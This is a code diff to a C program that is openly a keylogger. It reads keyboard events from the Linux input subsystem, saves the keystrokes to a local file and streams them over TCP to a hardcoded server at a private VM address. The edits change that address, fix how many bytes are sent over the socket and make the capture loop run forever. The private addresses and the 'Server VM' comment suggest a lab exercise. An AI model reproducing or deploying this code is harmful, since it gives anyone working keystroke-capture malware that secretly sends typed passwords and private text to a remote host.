@@ -3,13 +3,15 @@
 #include <fcntl.h>
 #include <unistd.h>
 #include <strings.h>
+#include <string.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
 #include <linux/input.h>
 #include <netdb.h>
 #define PORT 8080
 // Server address will depend on your VM
-#define ADDRESS "10.0.2.15"
+// #define ADDRESS "10.0.2.15"
+#define ADDRESS "192.168.56.101" //Alvin's Server VM
 #define SA struct sockaddr
 
 char *keys = "__1234567890-=__qwertyuiop[]__asdfghjkl;'___zxcvbnm,./";
@@ -37,7 +39,7 @@ void keylogger(int log_file, int sockfd) {
             switch(event.code) {
                 case 14:
                     write(log_file, "[DELETE]", sizeof("[DELETE]"));
-		    write(sockfd, "[DELETE]", sizeof("[DELETE]"));
+		    write(sockfd, "[DELETE]", strlen("[DELETE]"));
 		    break;
                 case 15:
                     write(log_file, "\t", sizeof(char));
@@ -45,7 +47,7 @@ void keylogger(int log_file, int sockfd) {
 		    break;
                 case 28:
                     write(log_file, "[ENTER]", sizeof("[ENTER]"));
-		    write(sockfd, "[ENTER]", sizeof("[ENTER]"));
+		    write(sockfd, "[ENTER]", strlen("[ENTER]"));
 		    break;
                 case 43:
                     write(log_file, "\\", sizeof(char));
@@ -65,7 +67,7 @@ void keylogger(int log_file, int sockfd) {
     }
 }
 
-int main() { 
+int main() {
     int fd = open("log.txt", O_CREAT | O_TRUNC | O_RDWR);
 
     //TCP Client based on https://www.geeksforgeeks.org/tcp-server-client-implementation-in-c/
@@ -95,8 +97,9 @@ int main() {
     else
         printf("connected to the server..\n");
 
-    keylogger(fd, sockfd);
-    
+    while(1)
+    keylogger(fd,sockfd);
+
     close(sockfd);
     return 1;
 }
